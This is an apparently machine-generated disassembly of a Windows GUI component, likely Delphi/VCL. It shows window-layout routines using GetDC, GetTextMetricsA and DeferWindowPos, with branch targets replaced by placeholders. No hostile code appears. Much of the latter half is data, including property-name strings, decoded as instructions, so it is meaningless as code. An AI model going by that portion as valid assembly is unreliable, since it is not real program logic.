call sub_43f558
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42b0dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42b141
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434960
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42b146
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45cc50
call sub_403a60
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b16c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4426ec
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403454
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42b1ac
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_442534
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403454
pop edx
pop esi
pop ebx
retn
sub_42b1d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43321c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42b488
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42b268
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42b4fc
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403258
mov eax [ esi + 0x210 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44540c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42b2b8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41ce2c
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42b441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_443708
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43ce40
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43c924
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_413f44
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403454
test al al
je r-xdata
sub_42b450
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413fa0
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43cb2c
mov eax ebx
mov si 0xffeb
call sub_403454
sub_42b488
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42b600
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42b4fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b020
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_41402c
call sub_403258
pop edi
pop esi
pop ebx
retn
sub_42b53c
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42b2b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b574
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_413f44
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413f44
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42b600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42b6c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42b4fc
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42b2b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b6d0
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_413f44
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413f44
pop edx
call sub_43cf50
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42b6d8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442bf4
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_413f44
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42b74c
push esi
inc edi
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] ch
push esi
inc edi
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] dl
push esi
inc edi
add [ esi ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] bl
push esi
inc edi
add [ esi ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] al
push esi
inc edi
add [ esi ] al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
push esi
inc edi
add [ 0x640000ff ] cl
push esi
inc edi
add [ esi ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add al dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ ecx + ebp + 0x47 ] bh
add [ eax + edi * 4 + 0x29740042 ] bh
inc edi
add [ eax + edi * 4 + 0x296c0042 ] dh
inc edi
add [ eax + edi * 4 + 0x29640042 ] ch
inc edi
add [ eax + edi * 4 + 0x295c0042 ] ah
inc edi
add [ eax + edi * 4 + 0x29540042 ] bl
inc edi
add [ eax + edi * 4 + 0x294c0042 ] dl
inc edi
add [ eax + edi * 4 + 0x29440042 ] cl
inc edi
add [ eax + edi * 4 + 0x293c0042 ] al
inc edi
add [ eax + edi * 4 + 0x42 ] bh
add [ ecx + ebp ] dh
inc edi
add [ eax + edi * 4 + 0x42 ] dh
add [ ecx + ebp ] ch
inc edi
add [ eax + edi * 4 + 0x42 ] ch
add [ ecx + ebp ] ah
inc edi
add [ eax + edi * 4 + 0x42 ] ah
add [ ecx + ebp ] bl
inc edi
add [ eax + edi * 4 + 0x42 ] bl
add [ ecx + ebp ] dl
inc edi
add [ eax + edi * 4 + 0x42 ] dl
add [ ecx + ebp ] cl
inc edi
add [ eax + edi * 4 + 0x42 ] cl
add [ ecx + ebp ] al
inc edi
add [ eax + edi * 4 + 0x42 ] al
add ah bh
sub [ edi ] al
cmp al 0xb8
inc edx
add ah dh
sub [ edi ] al
xor al 0xb8
inc edx
add ah ch
sub [ edi ] al
sub al 0xb8
inc edx
add ah ah
sub [ edi ] al
and al 0xb8
inc edx
add ah bl
sub [ edi ] al
sbb al 0xb8
inc edx
add ah dl
sub [ edi ] al
adc al 0xb8
inc edx
add ah cl
sub [ edi ] al
or al 0xb8
inc edx
add ah al
sub [ edi ] al
add al 0xb8
inc edx
add [ eax + ebp - 0x4803ffb9 ] bh
inc edx
add [ eax + ebp - 0x480bffb9 ] dh
inc edx
add [ eax + ebp - 0x4813ffb9 ] ch
inc edx
add [ eax + ebp - 0x481bffb9 ] ah
inc edx
add [ eax + ebp - 0x4823ffb9 ] bl
inc edx
add [ eax + ebp - 0x482bffb9 ] dl
inc edx
add [ eax + ebp - 0x4833ffb9 ] cl
inc edx
add [ eax + ebp - 0x483bffb9 ] al
inc edx
add [ eax + ebp + 0x47 ] bh
add [ edi + esi * 4 + 0x28740042 ] bh
inc edi
add [ edi + esi * 4 + 0x286c0042 ] dh
inc edi
add [ edi + esi * 4 + 0x28640042 ] ch
inc edi
add [ edi + esi * 4 + 0x285c0042 ] ah
inc edi
add [ edi + esi * 4 + 0x28540042 ] bl
inc edi
add [ edi + esi * 4 + 0x284c0042 ] dl
inc edi
add [ edi + esi * 4 + 0x28440042 ] cl
inc edi
add [ edi + esi * 4 + 0x283c0042 ] al
inc edi
add [ edi + esi * 4 + 0x42 ] bh
add [ eax + ebp ] dh
inc edi
add [ edi + esi * 4 + 0x42 ] dh
add [ eax + ebp ] ch
inc edi
add [ edi + esi * 4 + 0x42 ] ch
add [ eax + ebp ] ah
inc edi
add [ edi + esi * 4 + 0x42 ] ah
add [ eax + ebp ] bl
inc edi
add [ edi + esi * 4 + 0x42 ] bl
add [ eax + ebp ] dl
inc edi
add [ edi + esi * 4 + 0x42 ] dl
add [ eax + ebp ] cl
inc edi
add [ edi + esi * 4 + 0x42 ] cl
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ba7c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba83
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404a30
sub_42bab8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42badd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bae4
retn
sub_42baf0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bb21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bb28
retn
mov eax [ rw-data ]
call sub_403258
sub_42bbbc
sar [ ebx + 0xd030042 ] 0x54
inc edx
jne r-xdata
add [ eax ] al
je r-xdata
inc ebx
add al ch
rol [ edx ] cl
in al 0xbd
inc ebx
add [ esp + edx * 8 ] dh
inc edx
add [ edx + edx * 4 - 0x40a3ffbc ] cl
inc ebx
add [ eax ] bl
mov esi 0x92c80043
inc esp
add ah bl
xchg edx eax
inc esp
add [ eax - 0x42 ] dl
inc ebx
add [ ebx + edx * 4 ] al
inc esp
add [ esi + edi * 4 - 0x2b9bffbd ] ch
inc edx
add ah cl
mov esi 0xd4840043
inc edx
add al ah
mov edi 0xbfc00043
inc ebx
add [ eax ] al
rol [ ebx ] 0xec
mov esi 0x93280043
inc esp
add [ ebx + edx * 4 ] ch
inc esp
add [ eax ] dl
mov edi 0xbc800043
inc ebx
add [ esi ] dl
push esp
push ebx
jo r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
mov esp 0x240042
add [ eax ] al
cwde
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
inc ebx
add [ eax ] al
inc ebp
inc ecx
add [ eax ] bh
fiadd [ edx ]
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
jne r-xdata
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x620b0042 ] bh
insb
inc edi
insb
jns r-xdata
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + edx * 8 - 0x215bffbe ] ah
inc ebx
add [ eax + 0x700043de ] ah
fild [ ebx ]
retn 0x43
add [ eax ] cl
int 0x43
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x42bd6090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
mov ebp 0xbe520042
inc edx
add [ ecx + eax - 0x6f780000 ] al
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
xor al 0xe3
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ebp + edx * 8 + 0x42 ] ah
add [ eax + esi * 8 ] dl
inc ebx
add [ esp ] cl
add ah bh
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
inc eax
add [ eax - 0x3bffbe5e ] cl
rol [ edx ] cl
mov esp 0x840041a2
mov esi 0xa2f00043
add [ edx + esi ] cl
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
mov ah 0x34
inc eax
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add [ eax ] dh
mov edi 0xa2400043
inc ecx
add [ esi + edi * 4 - 0x5d0fffbd ] al
je r-xdata
inc ecx
add ah dl
mov [ 0xffffffffa3280041 ] al
inc ecx
add [ eax - 0x43 ] dh
add [ edx - 0x417bffbf ] bh
inc ebx
add al dh
mov [ 0xffffffffbf300041 ] al
inc ebx
add [ eax - 0x5e ] al
outsb
jae r-xdata
adc [ eax - 0x50 ] ch
mov ebx 0xe9c30042
rcr [ esp + edi * 4 ] 0x42
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
cmp [ edx + eax * 2 ] 0x0
sub_42bd72
inc ebx
add [ ebx + eax * 8 + 0x43 ] bl
add [ eax ] cl
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esp + edx * 8 - 0x215bffbe ] ah
inc ebx
add [ eax + 0x700043de ] ah
fild [ ebx ]
retn 0x43
sub_42be10
jmp r-xdata
[ esi + ebx * 8 + 0x42 ]
add [ esi + ebx * 8 + 0x42 ] bh
add [ eax + 0x200042de ] dh
fild [ edx ]
mov eax 0xc00042df
fild [ edx ]
enter 0x42df 0x0
in al dx
fild [ edx ]
pushad
loopne r-xdata
xchg ecx eax
add [ eax - 0x1f ] bl
inc edx
add [ eax - 0x24 ] dh
inc edx
add [ esp + ebx * 8 + 0x42 ] bl
add [ edx + ebx * 8 + 0x42 ] ah
add [ edx + ebx * 8 - 0x24a3ffbe ] bh
inc edx
add [ esp + ebx * 8 + 0x42 ] dl
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
add bh bh
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
inc edx
jne r-xdata
add dh bh
inc esp
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
add [ edi ] bl
outsb
jae r-xdata
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8865646f
insb
insb
push ebp
jo r-xdata
popad
add [ eax ] al
push [ edx + eax * 8 + 0x43 ]
je r-xdata
dec ecx
outsb
js r-xdata
add [ eax + eax ] dh
push esp
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add [ edx + ebp + 0x3c0041 ] bl
add dh bh
xchg esp eax
retn 0x43
add bh bh
dec eax
fiadd [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
jl r-xdata
outsb
nop
mov esi 0xc070042
push esp
push ebx
jo r-xdata
adc [ eax ] al
jo r-xdata
add [ fs : eax ] al
jb r-xdata
jge r-xdata
add [ ecx ] ah
add bh bh
je r-xdata
inc edx
jne r-xdata
call [ ebx * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add bh bh
adc al 0xdd
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ edi ] al
inc ebx
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
mov al [ 0x10042dd ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
add [ eax ] dl
retn
inc ebx
add [ 0x6e410700 ] cl
je r-xdata
add [ eax + edx * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
popad
jo r-xdata
mov [ ebx + eax * 2 ] bh
and bh cl
inc ebx
add [ eax - 0x31 ] dl
inc ebx
add [ edi + ebp * 8 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070012 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
test ch bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
add [ eax ] eax
adc al 0x41
arpl [ eax + 0x6f ] bp
jb r-xdata
add eax [ eax ]
add [ eax ] al
or eax 0x6e410700
inc ebx
add [ edi ] ah
add [ edi ] al
inc edx
jne r-xdata
outsb
pushad
mov ebp 0x917c0042
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov edi 0xdc780041
inc edx
add [ esp + ebx * 8 + 0x10042 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ 0x70796c47 ] al
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push sub_42bbbc
jae r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
mov ch 0x41
add [ eax ] ch
add bh bh
adc al 0xd0
inc ebx
add [ edx - 0x6b010000 ] bl
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
push [ ebp + ebx * 8 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
mov ah 0xdd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
sbb eax [ eax ]
push cs
push eax
inc ebx
cmp al 0x10
inc eax
add [ ecx + eax ] bh
call eax
fld [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb [ eax ] al
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
inc [ eax - 0x32 ]
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xac656c62
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
push esp
jb r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
popad
jb r-xdata
imul ebp [ esi + 0x18 ] 0x9c0042bc
fadd [ edx ]
test al 0xdc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ esi + 0x75 ] ecx
insd
inc edi
insb
jns r-xdata
inc edx
add [ eax + 0x4c000000 ] cl
xchg ebp eax
inc ebx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + eax * 8 ] ch
inc edx
add [ eax - 0x55 ] ah
inc esp
add al ch
scasb [ edi ]
inc esp
